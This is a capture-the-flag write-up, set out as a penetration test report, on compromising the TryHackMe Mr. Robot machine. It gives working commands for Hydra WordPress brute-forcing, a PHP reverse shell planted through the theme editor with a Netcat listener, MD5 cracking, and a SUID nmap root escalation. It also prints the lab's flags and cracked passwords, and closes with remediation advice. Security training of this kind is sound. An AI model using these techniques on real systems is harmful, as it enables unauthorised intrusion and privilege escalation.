# 🤖 Mr. Robot CTF — Full Root Penetration Test Writeup

> **Platform:** TryHackMe  
> **Difficulty:** Medium  
> **Assessment Type:** Black-Box Penetration Test  
> **Tester:** Omar Hasanein  
> **Date:** May 1, 2026  
> **Result:** ✅ Full Root Compromise — All 3 Keys Retrieved

---

## 📋 Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope & Methodology](#2-scope--methodology)
3. [Technical Findings](#3-technical-findings)
   - [3.1 Reconnaissance — Port Scanning](#31-reconnaissance--port-scanning)
   - [3.2 Information Disclosure via robots.txt](#32-information-disclosure-via-robotstxt)
   - [3.3 WordPress Credential Brute-Force](#33-wordpress-credential-brute-force)
   - [3.4 Remote Code Execution via WordPress Theme Editor](#34-remote-code-execution-via-wordpress-theme-editor)
   - [3.5 Lateral Movement — User robot](#35-lateral-movement--user-robot)
   - [3.6 Privilege Escalation — SUID Nmap (GTFOBins)](#36-privilege-escalation--suid-nmap-gtfobins)
4. [Attack Chain Summary](#4-attack-chain-summary)
5. [Vulnerability Summary](#5-vulnerability-summary)
6. [Remediation Recommendations](#6-remediation-recommendations)
7. [Flags](#7-flags)

---

## 1. Executive Summary

This writeup documents a black-box penetration test conducted against the **Mr. Robot**-themed CTF machine hosted on TryHackMe (`10.114.172.79`). The assessment resulted in **full root-level compromise** through a chained attack vector combining OSINT, credential brute-forcing, web application exploitation, and Linux privilege escalation.

All **three hidden keys** were successfully retrieved, confirming complete system compromise.

| Key       | Location                        | Value                              | Access Level   |
|-----------|---------------------------------|------------------------------------|----------------|
| Key 1/3   | `/key-1-of-3.txt` (robots.txt)  | `073403c8a58a1f80d943455fb30724b9` | Public (Web)   |
| Key 2/3   | `/home/robot/key-2-of-3.txt`    | `822c73956184f694993bede3eb39f959` | User (robot)   |
| Key 3/3   | `/root/key-3-of-3.txt`          | `04787ddef27c3dee1ee161b21670b4e4` | Root           |

> **Overall Risk Rating: 🔴 CRITICAL**

---

## 2. Scope & Methodology

### 2.1 Scope

| Parameter    | Details                          |
|--------------|----------------------------------|
| Target IP    | `10.114.172.79`                  |
| Target OS    | Linux (Ubuntu, Docker container) |
| Web App      | WordPress 4.3.1                  |
| In Scope     | All ports and services on target |
| Out of Scope | Denial of Service attacks        |

### 2.2 Methodology

The assessment followed the standard penetration testing lifecycle:

| Phase               | Activities Performed                                               | Tools Used                      |
|---------------------|--------------------------------------------------------------------|----------------------------------|
| Reconnaissance      | Port scanning, service enumeration, robots.txt discovery           | Nmap, Browser                   |
| Enumeration         | WordPress version ID, wordlist discovery, directory brute-force    | WPScan (manual), robots.txt     |
| Exploitation        | WordPress credential brute-force, PHP shell upload via theme editor| Hydra, Burp Suite / Browser     |
| Post-Exploitation   | File system traversal, password hash extraction                    | Linux CLI                       |
| Privilege Escalation| SUID nmap binary exploitation for root shell                       | GTFOBins technique              |

---

## 3. Technical Findings

### 3.1 Reconnaissance — Port Scanning

**Severity: ℹ️ Informational**

An Nmap service scan (`-sC -sV`) was performed against the target, revealing three open ports:

```bash
nmap -sC -sV 10.114.172.79
```

| Port     | Protocol | Service  | Version                           | Risk   |
|----------|----------|----------|-----------------------------------|--------|
| 22/tcp   | SSH      | OpenSSH  | 8.2p1 Ubuntu                      | Medium |
| 80/tcp   | HTTP     | Apache   | —                                 | High   |
| 443/tcp  | HTTPS    | Apache   | SSL cert: `www.example.com`        | High   |

> **Note:** The SSL certificate was issued to `www.example.com` and had expired in September 2025 — a clear indicator of a default/test configuration with minimal hardening.

---

### 3.2 Information Disclosure via robots.txt

**Severity: 🟠 HIGH**

Browsing to `http://10.114.172.79/robots.txt` exposed two sensitive entries:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

- **`fsocity.dic`** — a 6.91 MB wordlist containing 858,160 words (reduced to 11,452 unique after dedup)
- **`key-1-of-3.txt`** — direct path to the first flag

```bash
curl http://10.114.172.79/key-1-of-3.txt
# → 073403c8a58a1f80d943455fb30724b9
```

> The `robots.txt` file essentially served as an **attacker's roadmap**, exposing both a credential wordlist and a sensitive file path. This is a critical misconfiguration.

**🚩 Key 1 Found:** `073403c8a58a1f80d943455fb30724b9`

---

### 3.3 WordPress Credential Brute-Force

**Severity: 🔴 CRITICAL**

The WordPress login page at `/wp-login.php` was identified. A key observation: the site's error messages differentiated between invalid usernames and invalid passwords, enabling **username enumeration**.

The username `Elliot` was derived from the Mr. Robot TV show theme. Using the deduplicated `fsocity.dic` wordlist, Hydra was used for brute-force:

```bash
# Deduplicate wordlist
sort fsocity.dic | uniq > clean.txt

# Brute-force with Hydra
hydra -l Elliot -P clean.txt 10.114.172.79 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect"
```

**Result:**
```
[80][http-post-form] host: 10.114.172.79   login: Elliot   password: ER28-0652
```

Successfully authenticated to WordPress admin dashboard at `/wp-admin/`.

---

### 3.4 Remote Code Execution via WordPress Theme Editor

**Severity: 🔴 CRITICAL**

With admin access to WordPress, the built-in **Theme Editor** was leveraged to inject a PHP reverse shell into an existing theme file (`404.php`).

**Attack path:**
```
Appearance → Editor → Select 404 Template → Replace with PHP reverse shell → Update File → Browse to 404 URL
```

A Netcat listener was set up on the attack machine:

```bash
nc -lvnp 4444
```

Triggering the modified template granted a web shell as the **`daemon`** user.

---

### 3.5 Lateral Movement — User `robot`

**Severity: 🟠 HIGH**

Upon gaining a shell as `daemon`, the `/home/robot` directory was enumerated, revealing two files:

```bash
ls -la /home/robot/
# key-2-of-3.txt      (readable by robot only)
# password.raw-md5    (readable by all)
```

The MD5 hash was extracted:

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

The hash was cracked using **John the Ripper** with the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt
# Cracked: abcdefghijklmnopqrstuvwxyz
```

Switched to the `robot` user and read Key 2:

```bash
su robot
cat /home/robot/key-2-of-3.txt
```

**🚩 Key 2 Found:** `822c73956184f694993bede3eb39f959`

---

### 3.6 Privilege Escalation — SUID Nmap (GTFOBins)

**Severity: 🔴 CRITICAL**

A search for SUID binaries revealed that `/usr/local/bin/nmap` had the SUID bit set with root ownership:

```bash
find / -perm -4000 2>/dev/null
# /usr/local/bin/nmap
```

Nmap version **3.81** supports `--interactive` mode — a feature documented on [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/) for privilege escalation:

```bash
nmap --interactive
nmap> !sh

whoami
# root

cat /root/key-3-of-3.txt
```

**🚩 Key 3 Found:** `04787ddef27c3dee1ee161b21670b4e4`

---

## 4. Attack Chain Summary

```
[Nmap Scan] ──► [robots.txt] ──► [Key 1 + Wordlist]
                                      │
                              [WordPress Login]
                                      │
                          [Hydra Brute-Force: Elliot:ER28-0652]
                                      │
                            [WP Admin → Theme Editor]
                                      │
                         [PHP Reverse Shell → daemon shell]
                                      │
                      [/home/robot/password.raw-md5 extracted]
                                      │
                    [John the Ripper → abcdefghijklmnopqrstuvwxyz]
                                      │
                           [su robot → Key 2]
                                      │
                   [SUID nmap --interactive → !sh → root]
                                      │
                                  [Key 3 ✅]
```

| Step | Action                                             | Result                          |
|------|----------------------------------------------------|---------------------------------|
| 1    | Nmap scan: ports 80, 443, 22 discovered            | Attack surface identified       |
| 2    | `robots.txt` browsed                               | Key 1 + wordlist acquired       |
| 3    | WordPress detected at `/wp-login.php`              | Login page targeted             |
| 4    | Hydra brute-force with `Elliot` + deduplicated list| Password `ER28-0652` cracked    |
| 5    | Admin login to `/wp-admin/`, Theme Editor opened   | Code execution possible         |
| 6    | PHP reverse shell injected into `404.php`          | Shell as `daemon` obtained      |
| 7    | `robot`'s MD5 hash found in `/home/robot/`         | Hash extracted                  |
| 8    | John the Ripper + `rockyou.txt`                    | Password: `abcdefghijklmnopqrstuvwxyz` |
| 9    | `su robot` → `key-2-of-3.txt`                      | Key 2 obtained                  |
| 10   | SUID `nmap --interactive` → `!sh` → root shell     | Key 3 + Full root access ✅     |

---

## 5. Vulnerability Summary

| ID   | Vulnerability                                      | Severity    | CVSS | Component          |
|------|----------------------------------------------------|-------------|------|--------------------|
| V-01 | Sensitive files exposed in `robots.txt`            | 🟠 High     | 7.5  | Web Server         |
| V-02 | Username enumeration via WP login error messages   | 🟡 Medium   | 5.3  | WordPress          |
| V-03 | Weak credentials (`Elliot:ER28-0652`)              | 🔴 Critical | 9.8  | WordPress Auth     |
| V-04 | PHP code execution via WP Theme Editor             | 🔴 Critical | 9.9  | WordPress Admin    |
| V-05 | Plaintext MD5 hash stored on disk                  | 🟠 High     | 8.1  | Linux Filesystem   |
| V-06 | Trivially crackable MD5 password hash              | 🟠 High     | 7.5  | Password Policy    |
| V-07 | SUID bit on `nmap` v3.81 allows root shell         | 🔴 Critical | 9.3  | Linux SUID Config  |
| V-08 | Outdated WordPress version (4.3.1)                 | 🟠 High     | 8.8  | WordPress CMS      |

---

## 6. Remediation Recommendations

### 🔴 Immediate Actions (Critical)

- **Remove or sanitize `robots.txt`** — never expose sensitive file paths or wordlists
- **Disable WordPress Theme/Plugin Editor** in production:
  ```php
  // Add to wp-config.php
  define('DISALLOW_FILE_EDIT', true);
  ```
- **Remove SUID bit from nmap:**
  ```bash
  chmod u-s /usr/local/bin/nmap
  ```
- **Enforce strong password policies** — disallow sequential/dictionary-based passwords

### 🟠 Short-term Fixes (High)

- Replace MD5 with **bcrypt** or **Argon2** for all password hashing
- Implement **account lockout** after 5 failed login attempts
- Use **generic error messages** on login page to prevent username enumeration
- **Update WordPress** to the latest stable release

### 🟡 Long-term Hardening (Medium)

- Implement a **Web Application Firewall (WAF)** with brute-force protection rules
- Enable **Multi-Factor Authentication (MFA)** for all admin accounts
- Conduct regular **SUID binary audits** across the filesystem

---

## 7. Flags

| Flag      | Value                              |
|-----------|------------------------------------|
| 🚩 Key 1  | `073403c8a58a1f80d943455fb30724b9` |
| 🚩 Key 2  | `822c73956184f694993bede3eb39f959` |
| 🚩 Key 3  | `04787ddef27c3dee1ee161b21670b4e4` |

---

*Writeup by **Omar Hasanein** — TryHackMe CTF Series*  
*[TryHackMe Profile](https://tryhackme.com/p/omar.hasanen67) | [GitHub Writeups](https://github.com/OmarHasanen8/TryHackMe-Writeups)*
